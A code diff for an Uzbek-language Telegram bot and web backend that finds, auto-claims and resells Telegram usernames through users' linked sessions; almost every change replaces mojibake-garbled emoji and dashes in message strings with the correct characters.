+            f"Nechta username kerak? (1—10 ta)\n"
+            f"💡 Narxi: <b>{price:,} so'm/dona</b>",
             parse_mode="HTML"
         )
 
@@ -1094,7 +1091,7 @@ async def text_handler(message: Message):
             if not 1 <= qty <= 10:
                 raise ValueError
         except ValueError:
-            await message.answer("вќЊ 1 dan 10 gacha son kiriting!")
+            await message.answer("❌ 1 dan 10 gacha son kiriting!")
             return
 
         price_per = int(await get_setting("username_price", 5000))
@@ -1104,16 +1101,16 @@ async def text_handler(message: Message):
         balance = user["balance"] if user else 0
 
         markup = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text=f"вњ… Tasdiqlash ({total:,} so'm)", callback_data=f"order_{cat}_{qty}_{total}")],
-            [InlineKeyboardButton(text="вќЊ Bekor qilish", callback_data="order_cancel")]
+            [InlineKeyboardButton(text=f"✅ Tasdiqlash ({total:,} so'm)", callback_data=f"order_{cat}_{qty}_{total}")],
+            [InlineKeyboardButton(text="❌ Bekor qilish", callback_data="order_cancel")]
         ])
         await message.answer(
-            f"рџ“‹ <b>Buyurtma tasdiqlash</b>\n\n"
-            f"рџЏ· Kategoriya: <b>{cat}</b>\n"
-            f"рџ”ў Miqdor: <b>{qty} ta</b>\n"
-            f"рџ’° Narxi: <b>{total:,} so'm</b>\n"
-            f"рџ’і Balansingiz: <b>{balance:,} so'm</b>\n\n"
-            f"{'вњ… Balans yetarli' if balance >= total else 'вќЊ Balans yetarli emas. Avval to\'ldiring!'}",
+            f"📋 <b>Buyurtma tasdiqlash</b>\n\n"
+            f"🏷 Kategoriya: <b>{cat}</b>\n"
+            f"🔢 Miqdor: <b>{qty} ta</b>\n"
+            f"💰 Narxi: <b>{total:,} so'm</b>\n"
+            f"💳 Balansingiz: <b>{balance:,} so'm</b>\n\n"
+            f"{'✅ Balans yetarli' if balance >= total else '❌ Balans yetarli emas. Avval to\'ldiring!'}",
             reply_markup=markup if balance >= total else None,
             parse_mode="HTML"
         )
@@ -1123,7 +1120,7 @@ async def text_handler(message: Message):
 @router.callback_query(F.data == "order_cancel")
 async def cancel_order(call: CallbackQuery):
     user_states.pop(call.from_user.id, None)
-    await call.message.edit_text("вќЊ Buyurtma bekor qilindi.")
+    await call.message.edit_text("❌ Buyurtma bekor qilindi.")
 
 @router.callback_query(F.data.startswith("setprofile_"))
 async def set_profile_username(call: CallbackQuery):
@@ -1138,7 +1135,7 @@ async def set_profile_username(call: CallbackQuery):
         return
         
     await call.answer("Jarayon boshlandi...")
-    await call.message.edit_text(f"вЏі @{username} profilingizga o'rnatilmoqda...")
+    await call.message.edit_text(f"⏳ @{username} profilingizga o'rnatilmoqda...")
     
     from telethon import TelegramClient
     from telethon.sessions import StringSession
@@ -1154,10 +1151,10 @@ async def set_profile_username(call: CallbackQuery):
         # 2. Profilga qo'yamiz
         await client(AccountUpdateUsernameRequest(username=username))
         
-        await call.message.edit_text(f"вњ… <b>Tabriklaymiz!</b>\n\n@{username} muvaffaqiyatli sizning Telegram profilingizga o'rnatildi!", parse_mode="HTML")
+        await call.message.edit_text(f"✅ <b>Tabriklaymiz!</b>\n\n@{username} muvaffaqiyatli sizning Telegram profilingizga o'rnatildi!", parse_mode="HTML")
     except Exception as e:
         logger.error(f"Set profile error: {e}")
-        await call.message.edit_text(f"вќЊ Xatolik yuz berdi: {e}\n\nKanal o'chirilgan bo'lishi mumkin. Telegramingizga kirib usernameni o'zingiz qo'yib ko'ring.")
+        await call.message.edit_text(f"❌ Xatolik yuz berdi: {e}\n\nKanal o'chirilgan bo'lishi mumkin. Telegramingizga kirib usernameni o'zingiz qo'yib ko'ring.")
     finally:
         await client.disconnect()
 
@@ -1181,18 +1178,18 @@ async def place_order(call: CallbackQuery):
 
     user_states.pop(user_id, None)
     await call.message.edit_text(
-        f"вњ… Buyurtma qabul qilindi!\n\n"
-        f"рџЏ· Kategoriya: <b>{cat}</b>\n"
-        f"рџ”ў Miqdor: <b>{qty} ta</b>\n"
-        f"рџ’° To'langan: <b>{total:,} so'm</b>\n\n"
-        f"вЏі Bot hozir username qidirishni boshlaydi. Topilgan nomlar sizga xabar qilinadi!",
+        f"✅ Buyurtma qabul qilindi!\n\n"
+        f"🏷 Kategoriya: <b>{cat}</b>\n"
+        f"🔢 Miqdor: <b>{qty} ta</b>\n"
+        f"💰 To'langan: <b>{total:,} so'm</b>\n\n"
+        f"⏳ Bot hozir username qidirishni boshlaydi. Topilgan nomlar sizga xabar qilinadi!",
         parse_mode="HTML"
     )
 
     # Fon rejimida username qidirish boshlash
     asyncio.create_task(run_sniper(call.bot, user_id, order_id, cat, qty))
 
-# в”Ђв”Ђв”Ђ SNIPER в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# ─── SNIPER ───────────────────────────────────
 async def run_sniper(bot, telegram_id, order_id, category, qty):
     """Fon rejimida qidirish va band qilish."""
     await search_sniper(telegram_id, order_id, category)
@@ -1214,9 +1211,9 @@ async def run_sniper(bot, telegram_id, order_id, category, qty):
                 await db.execute("UPDATE users SET balance=balance+? WHERE telegram_id=?", (order_row[0], telegram_id))
             await db.execute("UPDATE orders SET status='failed' WHERE id=?", (order_id,))
             await db.commit()
-        await bot.send_message(telegram_id, "вќЊ Afsuski, siz so'ragan kategoriyada bo'sh username topilmadi. Pulingiz qaytarildi.")
+        await bot.send_message(telegram_id, "❌ Afsuski, siz so'ragan kategoriyada bo'sh username topilmadi. Pulingiz qaytarildi.")
 
-# в”Ђв”Ђ TELETHON CLIENT CACHE в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# ── TELETHON CLIENT CACHE ────────────────────────
 _telethon_cache: dict = {}
 _active_search_tasks: set = set()
 
@@ -1459,7 +1456,7 @@ async def claim_sniper(bot, telegram_id: int, order_id: int, usernames: list):
                         else:
                             human_reason = f"Telegram ruxsat bermadi ({err_type})"
                             
-                        failed_reasons.append(f"@{username} вЂ” <b>{human_reason}</b>")
+                        failed_reasons.append(f"@{username} — <b>{human_reason}</b>")
                         
                         if ch:
                             try:
@@ -1467,7 +1464,7 @@ async def claim_sniper(bot, telegram_id: int, order_id: int, usernames: list):
                             except:
                                 pass
                         if "ChannelsAdminPublicTooMuch" in err_type:
-                            await bot.send_message(telegram_id, "вќЊ <b>Diqqat:</b> Ommaviy link yaratish limiti tugagan! Telegram ruxsat bermadi.", parse_mode="HTML")
+                            await bot.send_message(telegram_id, "❌ <b>Diqqat:</b> Ommaviy link yaratish limiti tugagan! Telegram ruxsat bermadi.", parse_mode="HTML")
                             break
                     await asyncio.sleep(1)
                 except FloodWaitError as e:
@@ -1536,19 +1533,19 @@ async def claim_sniper(bot, telegram_id: int, order_id: int, usernames: list):
                         
                 await db.commit()
                 
-            msg = f"рџЋ‰ <b>Buyurtma yakunlandi!</b>\nJami band qilindi: <b>{len(claimed)} ta</b>\n"
+            msg = f"🎉 <b>Buyurtma yakunlandi!</b>\nJami band qilindi: <b>{len(claimed)} ta</b>\n"
             if claimed:
-                msg += "\n".join(f"вњ… @{u}" for u in claimed)
+                msg += "\n".join(f"✅ @{u}" for u in claimed)
             else:
-                msg += "вќЊ Hech qanday nom olinmadi.\n\n<b>Sabablari:</b>\n" + "\n".join(failed_reasons)
+                msg += "❌ Hech qanday nom olinmadi.\n\n<b>Sabablari:</b>\n" + "\n".join(failed_reasons)
                 msg += "\n\n<i>To'langan pul balansingizga to'liq qaytarildi (Refund). Boshqa akkaunt bilan urinib ko'ring!</i>"
                 
             await bot.send_message(telegram_id, msg, parse_mode="HTML")
         elif claimed:
             # Ba'zilari olingan, ba'zilari deferred
-            msg = f"вњ… <b>{len(claimed)} ta</b> username band qilindi:\n"
-            msg += "\n".join(f"вњ… @{u}" for u in claimed)
-            msg += f"\n\nвЏі <b>{len(deferred)} tasi</b> blok tugagach avtomatik band qilinadi."
+            msg = f"✅ <b>{len(claimed)} ta</b> username band qilindi:\n"
+            msg += "\n".join(f"✅ @{u}" for u in claimed)
+            msg += f"\n\n⏳ <b>{len(deferred)} tasi</b> blok tugagach avtomatik band qilinadi."
             await bot.send_message(telegram_id, msg, parse_mode="HTML")
             
     except Exception as e:
@@ -1563,7 +1560,7 @@ async def claim_sniper(bot, telegram_id: int, order_id: int, usernames: list):
                 await db.commit()
             await bot.send_message(
                 telegram_id, 
-                f"вќЊ <b>Band qilishda xatolik yuz berdi:</b>\n<code>{e}</code>\n\n<i>To'langan pul balansingizga qaytarildi. Akkauntingiz ulanishini tekshiring!</i>",
+                f"❌ <b>Band qilishda xatolik yuz berdi:</b>\n<code>{e}</code>\n\n<i>To'langan pul balansingizga qaytarildi. Akkauntingiz ulanishini tekshiring!</i>",
                 parse_mode="HTML"
             )
         except Exception:
@@ -1605,7 +1602,7 @@ async def deferred_claim_loop(bot):
                 
                 logger.info(f"Deferred claim: order {order_id}, {len(usernames)} usernames")
                 
-                # Status qayta ko'rib chiqish вЂ” hozir band qilishga urinish
+                # Status qayta ko'rib chiqish — hozir band qilishga urinish
                 async with aiosqlite.connect(DB_PATH) as db:
                     await db.execute("UPDATE orders SET status='processing', pending_usernames='', floodwait_until=0 WHERE id=?", (order_id,))
                     await db.commit()
@@ -1644,7 +1641,7 @@ async def monitoring_loop(bot):
                 await asyncio.sleep(1.5)
                 continue
 
-            # в”Ђв”Ђ 1. DEDUPLICATION (Bitta usernameni 10 kishi poylayotgan bo'lsa, 1 marta tekshiramiz) в”Ђв”Ђ
+            # ── 1. DEDUPLICATION (Bitta usernameni 10 kishi poylayotgan bo'lsa, 1 marta tekshiramiz) ──
             uname_map = {}
             for t in tasks:
                 u_lower = t["username"].lower()
@@ -1670,13 +1667,13 @@ async def monitoring_loop(bot):
                                     return
                                 text = await resp.text()
                                 
-                                # Profil yoki kanal mavjud bo'lsa вЂ” hali bo'shamagan
+                                # Profil yoki kanal mavjud bo'lsa — hali bo'shamagan
                                 if 'tgme_page_title' in text or 'tgme_page_extra' in text:
                                     return
                         except Exception:
                             return
 
-                        # 2-qadam: Profil HTTP da yo'q bo'lsa (BO'SHAGAN) вЂ” har bir poylayotgan foydalanuvchida tartib bilan urinib ko'ramiz
+                        # 2-qadam: Profil HTTP da yo'q bo'lsa (BO'SHAGAN) — har bir poylayotgan foydalanuvchida tartib bilan urinib ko'ramiz
                         for task in task_group:
                             if not task["session_string"]: continue
                             try:
@@ -1697,7 +1694,7 @@ async def monitoring_loop(bot):
                                             try:
                                                 await bot.send_message(
                                                     task["telegram_id"],
-                                                    f"рџЋЇ <b>Nishon olindi!</b>\n\nKutgan usernamengiz bo'shadi va Siz uchun band qilindi: <b>@{uname}</b>",
+                                                    f"🎯 <b>Nishon olindi!</b>\n\nKutgan usernamengiz bo'shadi va Siz uchun band qilindi: <b>@{uname}</b>",
                                                     parse_mode="HTML"
                                                 )
                                             except: pass
@@ -1712,7 +1709,7 @@ async def monitoring_loop(bot):
                                                     await db.execute("UPDATE monitoring_tasks SET status='failed_limit' WHERE id=?", (task["id"],))
                                                     await db.commit()
                                                 try:
-                                                    await bot.send_message(task["telegram_id"], f"вќЊ @{uname} bo'shadi, lekin ommaviy link limiti tugagani uchun ololmadim.")
+                                                    await bot.send_message(task["telegram_id"], f"❌ @{uname} bo'shadi, lekin ommaviy link limiti tugagani uchun ololmadim.")
                                                 except: pass
                                 except FloodWaitError as e:
                                     await asyncio.sleep(e.seconds)
@@ -1729,14 +1726,14 @@ async def monitoring_loop(bot):
             
         await asyncio.sleep(0.2)
 
-# в”Ђв”Ђв”Ђ FASTAPI APP в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# ─── FASTAPI APP ──────────────────────────────
 app = FastAPI()
 
 # Static files
 if os.path.exists("static"):
     app.mount("/static", StaticFiles(directory="static"), name="static")
 
-# в”Ђв”Ђ Helper: Telegram initData verifikatsiya в”Ђв”Ђв”Ђв”Ђ
+# ── Helper: Telegram initData verifikatsiya ────
 def verify_init_data(init_data: str) -> dict | None:
     """Telegram WebApp init_data ni tekshiradi."""
     try:
@@ -1760,7 +1757,7 @@ def get_admin_token(telegram_id: int) -> str:
     secret = BOT_TOKEN + str(telegram_id)
     return hashlib.sha256(secret.encode()).hexdigest()[:32]
 
-# в”Ђв”Ђ Mini App Pages в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# ── Mini App Pages ─────────────────────────────
 @app.get("/app")
 async def mini_app():
     with open("static/app/index.html", encoding="utf-8") as f:
@@ -1775,7 +1772,7 @@ async def admin_panel():
             "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0"
         })
 
-# в”Ђв”Ђ Mini App API в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# ── Mini App API ───────────────────────────────
 @app.get("/api/user")
 async def api_user(init_data: str = ""):
     user = verify_init_data(init_data)
@@ -1837,7 +1834,7 @@ async def api_account_set_username(request: Request):
     try:
         client = await _get_fast_client(row['session_string'])
         
-        # Agar kanal ID frontend dan kelmasa вЂ” kanal ro'yxatidan topamiz
+        # Agar kanal ID frontend dan kelmasa — kanal ro'yxatidan topamiz
         if not source_channel_id:
             req = GetAdminedPublicChannelsRequest(by_location=False, check_limit=False)
             res_ch = await client(req)
@@ -1859,7 +1856,7 @@ async def api_account_set_username(request: Request):
             # 2-qadam: Profilga o'rnatish (shu zahotiyoq)
             await client(AccountUpdateUsernameRequest(username=username))
             
-            # 3-qadam: Eski profil username'ini kanalga qaytarish вЂ” FONDA (kutmaydi)
+            # 3-qadam: Eski profil username'ini kanalga qaytarish — FONDA (kutmaydi)
             if old_username:
                 async def restore_old():
                     try:
@@ -1868,20 +1865,20 @@ async def api_account_set_username(request: Request):
                         pass
                 asyncio.create_task(restore_old())
         else:
-            # Oddiy profil username (kanal emas) вЂ” to'g'ridan to'g'ri o'rnatamiz
+            # Oddiy profil username (kanal emas) — to'g'ridan to'g'ri o'rnatamiz
             await client(AccountUpdateUsernameRequest(username=username))
         
         return {"ok": True, "message": f"@{username} profilingizga o'rnatildi!"}
     except Exception as e:
         logger.error(f"Set username error: {e}")
-        # Keshdan o'chiramiz вЂ” keyingi safar yangi ulanish bo'ladi
+        # Keshdan o'chiramiz — keyingi safar yangi ulanish bo'ladi
         _telethon_cache.pop(row['session_string'], None)
         return {"ok": False, "error": str(e)}
 
 
 @app.post("/api/referral/send_promo")
 async def api_referral_send_promo(request: Request):
-    """Foydalanuvchiga rasmli reklama xabar yuboradi вЂ” u xohlagan guruhga forward qiladi."""
+    """Foydalanuvchiga rasmli reklama xabar yuboradi — u xohlagan guruhga forward qiladi."""
     data = await request.json()
     user = verify_init_data(data.get('init_data', ''))
     if not user:
@@ -1895,17 +1892,17 @@ async def api_referral_send_promo(request: Request):
         ref_link = f"https://t.me/{bot_username}?start=ref_{tid}"
 
         promo_caption = (
-            "рџЋЇ <b>Orzuingizdagi username вЂ” 1 soniyada!</b>\n\n"
-            "рџ”Ќ Username qidirish вЂ” bo'sh nomlar topib beradi\n"
-            "рџЋЇ Poylash вЂ” bo'shagan zahoti avtomatik band qiladi\n"
-            "рџ›’ Bozor вЂ” username sotish & sotib olish\n"
-            "рџ”„ Almashtirish вЂ” 1 bosishda profilingizga o'rnatish\n\n"
-            "рџЋЃ Har bir do'st uchun <b>+1 000 so'm bonus!</b>\n\n"
-            "рџ‘‡ Hoziroq bosing:"
+            "🎯 <b>Orzuingizdagi username — 1 soniyada!</b>\n\n"
+            "🔍 Username qidirish — bo'sh nomlar topib beradi\n"
+            "🎯 Poylash — bo'shagan zahoti avtomatik band qiladi\n"
+            "🛒 Bozor — username sotish & sotib olish\n"
+            "🔄 Almashtirish — 1 bosishda profilingizga o'rnatish\n\n"
+            "🎁 Har bir do'st uchun <b>+1 000 so'm bonus!</b>\n\n"
+            "👇 Hoziroq bosing:"
         )
 
         kb = InlineKeyboardMarkup(inline_keyboard=[[
-            InlineKeyboardButton(text="рџљЂ Botga kirish (+1,000 so'm bonus)", url=ref_link)
+            InlineKeyboardButton(text="🚀 Botga kirish (+1,000 so'm bonus)", url=ref_link)
         ]])
 
         import os
@@ -1945,7 +1942,7 @@ async def api_account_usernames(init_data: str = ""):
     usernames = []
     seen = set()
 
-    # 1. TELETHON вЂ” Hozir haqiqatan egalik qilinayotgan usernamelar (session bo'lsa)
+    # 1. TELETHON — Hozir haqiqatan egalik qilinayotgan usernamelar (session bo'lsa)
     telethon_owned = set()  # Telethon orqali tasdiqlangan usernamelar
 
     if row and row.get('session_string'):
@@ -1988,13 +1985,13 @@ async def api_account_usernames(init_data: str = ""):
                                         is_listed = bool(await lc.fetchone())
                                     usernames.append({"username": uname, "title": title or "Kanal/Guruh", "channel_id": ch.id, "is_listed": is_listed})
         except asyncio.TimeoutError:
-            logger.warning(f"Telethon usernames timeout for user {tid} вЂ” skipping Telethon check")
+            logger.warning(f"Telethon usernames timeout for user {tid} — skipping Telethon check")
         except Exception as e:
             logger.warning(f"Telethon usernames fetch warning: {e}")
 
-    # 2. BAZADAN вЂ” Buyurtma orqali band qilingan usernamelar
+    # 2. BAZADAN — Buyurtma orqali band qilingan usernamelar
     #    Agar Telethon session mavjud bo'lsa, faqat hozir ham egalik qilinayotganlarini ko'rsatamiz.
-    #    Session yo'q bo'lsa вЂ” hamma DB usernamelarini ko'rsatamiz (tekshira olmaymiz).
+    #    Session yo'q bo'lsa — hamma DB usernamelarini ko'rsatamiz (tekshira olmaymiz).
     async with aiosqlite.connect(DB_PATH) as db:
         db.row_factory = aiosqlite.Row
         async with db.execute("""
@@ -2008,10 +2005,10 @@ async def api_account_usernames(init_data: str = ""):
                 u = r['username']
                 if not u:
                     continue
-                # Telethon session bo'lsa вЂ” faqat hozir egalik qilinayotganlarni qo'sh
+                # Telethon session bo'lsa — faqat hozir egalik qilinayotganlarni qo'sh
                 if row and row.get('session_string'):
                     if u.lower() not in telethon_owned:
-                        continue  # Bu username endi foydalanuvchida yo'q вЂ” o'tkazib yubor
+                        continue  # Bu username endi foydalanuvchida yo'q — o'tkazib yubor
                 if u.lower() not in seen:
                     seen.add(u.lower())
                     async with db.execute("SELECT id FROM listings WHERE LOWER(username)=LOWER(?) AND status='active'", (u,)) as lc:
@@ -2027,7 +2024,7 @@ async def api_account_usernames(init_data: str = ""):
 
 
 
-# в”Ђв”Ђ MARKETPLACE в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# ── MARKETPLACE ────────────────────────────────
 @app.get("/api/marketplace")
 async def api_marketplace(init_data: str = "", sort: str = "newest", offset: int = 0):
     user = verify_init_data(init_data)
@@ -2116,19 +2113,19 @@ async def api_marketplace_list(request: Request):
                 # Bot username bilan to'g'ri Mini App havolasi
                 app_link = f"https://t.me/{bot_username}/app?startapp=listing_{new_listing_id}"
                 
-                type_tag = "вљЎ AUKSION (24 Soat)" if is_auction else "рџЏ· SOTUVDA"
+                type_tag = "⚡ AUKSION (24 Soat)" if is_auction else "🏷 SOTUVDA"
                 price_text = f"<b>{price:,} so'm</b> (Boshlang'ich narx)" if is_auction else f"<b>{price:,} so'm</b>"
                 
                 post_text = (
-                    f"рџ”Ґ <b>YANGI USERNAME BOZORGA CHIQARILDI!</b>\n\n"
-                    f"рџ“Њ <b>Turi:</b> {type_tag}\n"
-                    f"рџ’Ћ <b>Username:</b> @{username}\n"
-                    f"рџ’° <b>Narxi:</b> {price_text}\n"
-                    f"рџ‘¤ <b>Sotuvchi:</b> {user.get('first_name','Foydalanuvchi')}\n\n"
-                    f"вљЎ <i>Ushbu nomni band qilish yoki auksionda qatnashish uchun quyidagi tugmani bosing:</i>"
+                    f"🔥 <b>YANGI USERNAME BOZORGA CHIQARILDI!</b>\n\n"
+                    f"📌 <b>Turi:</b> {type_tag}\n"
+                    f"💎 <b>Username:</b> @{username}\n"
+                    f"💰 <b>Narxi:</b> {price_text}\n"
+                    f"👤 <b>Sotuvchi:</b> {user.get('first_name','Foydalanuvchi')}\n\n"
+                    f"⚡ <i>Ushbu nomni band qilish yoki auksionda qatnashish uchun quyidagi tugmani bosing:</i>"
                 )
                 m_markup = InlineKeyboardMarkup(inline_keyboard=[
-                    [InlineKeyboardButton(text="рџ›’ E'lonni ko'rish & Sotib olish", url=f"https://t.me/{bot_username}?start=listing_{new_listing_id}")]
+                    [InlineKeyboardButton(text="🛒 E'lonni ko'rish & Sotib olish", url=f"https://t.me/{bot_username}?start=listing_{new_listing_id}")]
                 ])
                 sent_msg = await bot_inst.send_message(target_chan, post_text, reply_markup=m_markup, parse_mode="HTML")
                 if sent_msg:
@@ -2162,13 +2159,13 @@ async def update_channel_listing_post(listing_id: int, status: str = 'sold'):
         
         if status == 'sold':
             sold_text = (
-                f"вњ… <b>USHBU USERNAME SOTILDI!</b>\n\n"
-                f"рџ’Ћ <b>Username:</b> <code>@{listing['username']}</code>\n"
-                f"рџ’° <b>Sotilgan narx:</b> <b>{listing['price']:,} so'm</b>\n\n"
-                f"рџЋ‰ <i>Ushbu e'lon muvaffaqiyatli yakunlandi va egasini topdi.</i>"
+                f"✅ <b>USHBU USERNAME SOTILDI!</b>\n\n"
+                f"💎 <b>Username:</b> <code>@{listing['username']}</code>\n"
+                f"💰 <b>Sotilgan narx:</b> <b>{listing['price']:,} so'm</b>\n\n"
+                f"🎉 <i>Ushbu e'lon muvaffaqiyatli yakunlandi va egasini topdi.</i>"
             )
             sold_markup = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="вњ… SOTILDI", callback_data="none")]
+                [InlineKeyboardButton(text="✅ SOTILDI", callback_data="none")]
             ])
             await bot_inst.edit_message_text(
                 chat_id=listing['channel_id'],
@@ -2212,7 +2209,7 @@ async def update_channel_listing_post(listing_id: int, status: str = 'sold'):
                     try:
                         await bot_instance.send_message(
                             sub['user_id'], 
-                            f"рџ”” <b>Xushxabar!</b>\n\nSiz poylagan so'zga mos <b>@{username}</b> bozorda sotuvga chiqdi!\nNarxi: <b>{price:,} so'm</b>",
+                            f"🔔 <b>Xushxabar!</b>\n\nSiz poylagan so'zga mos <b>@{username}</b> bozorda sotuvga chiqdi!\nNarxi: <b>{price:,} so'm</b>",
                             parse_mode="HTML"
                         )
                     except: pass
@@ -2288,7 +2285,7 @@ async def api_marketplace_buy(request: Request):
     
     return {"ok": False, "error": "Xatolik yuz berdi"}
 
-# в”Ђв”Ђ TOP LISTINGS & USERNAME CHECKER в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# ── TOP LISTINGS & USERNAME CHECKER ─────────────
 @app.get("/api/marketplace/top")
 async def api_marketplace_top(init_data: str = ""):
     user = verify_init_data(init_data)
@@ -2313,7 +2310,7 @@ async def api_marketplace_top(init_data: str = ""):
                     rows = [dict(r) for r in await c2.fetchall()]
     return rows
 
-# в”Ђв”Ђ AUCTION BID ENDPOINT в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# ── AUCTION BID ENDPOINT ──────────────────────
 @app.post("/api/auction/bid")
 async def api_auction_bid(request: Request):
     data = await request.json()
@@ -2349,7 +2346,7 @@ async def api_auction_bid(request: Request):
         if prev_bidder and prev_bidder != tid:
             try:
                 bot_inst = Bot(token=BOT_TOKEN)
-                await bot_inst.send_message(prev_bidder, f"вљЎ <b>Stavka oshirildi!</b>\n\n@{listing['username']} auksionida sizning stavkangizdan yuqori (<b>{bid_amount:,} so'm</b>) stavka berildi.")
+                await bot_inst.send_message(prev_bidder, f"⚡ <b>Stavka oshirildi!</b>\n\n@{listing['username']} auksionida sizning stavkangizdan yuqori (<b>{bid_amount:,} so'm</b>) stavka berildi.")
             except Exception: pass
             
 @app.post("/api/check_username")
@@ -2428,11 +2425,11 @@ async def api_seller_withdraw(request: Request):
         try:
             await bot_instance.send_message(
                 admin_id,
-                f"рџ’ё <b>Pul yechish so'rovi!</b>\n\n"
-                f"рџ‘¤ {first_name} (ID: {tid})\n"
-                f"рџ’° Summa: <b>{amount:,} so'm</b>\n"
-                f"рџ’і Karta: <b>{card_number}</b>\n"
-                f"рџ‘¤ Egasi: <b>{card_owner}</b>\n\n"
+                f"💸 <b>Pul yechish so'rovi!</b>\n\n"
+                f"👤 {first_name} (ID: {tid})\n"
+                f"💰 Summa: <b>{amount:,} so'm</b>\n"
+                f"💳 Karta: <b>{card_number}</b>\n"
+                f"👤 Egasi: <b>{card_owner}</b>\n\n"
                 f"Admin paneldan tasdiqlang yoki rad eting.",
                 parse_mode="HTML"
             )
@@ -2464,7 +2461,7 @@ async def api_seller_transfer(request: Request):
     
     return {"ok": True, "message": f"{amount:,} so'm asosiy balansga o'tkazildi!"}
 
-# в”Ђв”Ђ PREMIUM & SUBSCRIPTIONS в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# ── PREMIUM & SUBSCRIPTIONS ────────────────────
 @app.post("/api/premium/buy")
 async def api_premium_buy(request: Request):
     data = await request.json()
@@ -2521,7 +2518,7 @@ async def api_subscriptions_remove(request: Request):
         await db.commit()
     return {"ok": True}
 
-# в”Ђв”Ђ ADMIN WITHDRAWALS в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# ── ADMIN WITHDRAWALS ──────────────────────────
 @app.get("/api/admin/withdrawals")
 async def admin_withdrawals(x_admin_token: str = Header(default="")):
     for aid in ADMIN_IDS:
@@ -2554,9 +2551,9 @@ async def admin_withdrawal_confirm(request: Request, x_admin_token: str = Header
     try:
         await bot_instance.send_message(
             w['telegram_id'],
-            f"вњ… <b>To'lov amalga oshirildi!</b>\n\n"
-            f"рџ’° <b>{w['amount']:,} so'm</b> kartangizga o'tkazildi.\n"
-            f"рџ’і Karta: <b>{w['card_number']}</b>",
+            f"✅ <b>To'lov amalga oshirildi!</b>\n\n"
+            f"💰 <b>{w['amount']:,} so'm</b> kartangizga o'tkazildi.\n"
+            f"💳 Karta: <b>{w['card_number']}</b>",
             parse_mode="HTML"
         )
     except: pass
@@ -2584,7 +2581,7 @@ async def admin_withdrawal_reject(request: Request, x_admin_token: str = Header(
     try:
         await bot_instance.send_message(
             w['telegram_id'],
-            f"вќЊ <b>To'lov rad etildi.</b>\n\n"
+            f"❌ <b>To'lov rad etildi.</b>\n\n"
             f"<b>{w['amount']:,} so'm</b> sotuvchi balansingizga qaytarildi.",
             parse_mode="HTML"
         )
@@ -3069,7 +3066,7 @@ async def api_admin_channels_delete(request: Request, x_admin_token: str = Heade
     return {"ok": True}
 
 
-# в”Ђв”Ђ ADMIN MASS BROADCAST (OMMAVIY XABARNOMA) в”Ђв”Ђв”Ђв”Ђ
+# ── ADMIN MASS BROADCAST (OMMAVIY XABARNOMA) ────
 @app.post("/api/admin/broadcast")
 async def api_admin_broadcast(request: Request, x_admin_token: str = Header(default="")):
     for aid in ADMIN_IDS:
@@ -3133,7 +3130,7 @@ async def api_admin_broadcast(request: Request, x_admin_token: str = Header(defa
     return {"ok": True, "sent": sent_count, "failed": fail_count, "total": len(users)}
 
 
-# в”Ђв”Ђ ADMIN CARDS (Multi-Card Management) в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# ── ADMIN CARDS (Multi-Card Management) ────────
 @app.get("/api/admin/cards")
 async def api_admin_cards_get(x_admin_token: str = Header(default="")):
     for aid in ADMIN_IDS:
@@ -3350,7 +3347,7 @@ async def admin_approve(request: Request, x_admin_token: str = Header(default=""
         await db.commit()
     bot_instance = Bot(token=BOT_TOKEN)
     try:
-        await bot_instance.send_message(tid, f"рџЋ‰ Balansingiz <b>{amt:,} so'm</b>ga to'ldirildi!", parse_mode="HTML")
+        await bot_instance.send_message(tid, f"🎉 Balansingiz <b>{amt:,} so'm</b>ga to'ldirildi!", parse_mode="HTML")
     finally:
         await bot_instance.session.close()
     return {"ok": True}
@@ -3367,7 +3364,7 @@ async def admin_reject(request: Request, x_admin_token: str = Header(default="")
         await db.commit()
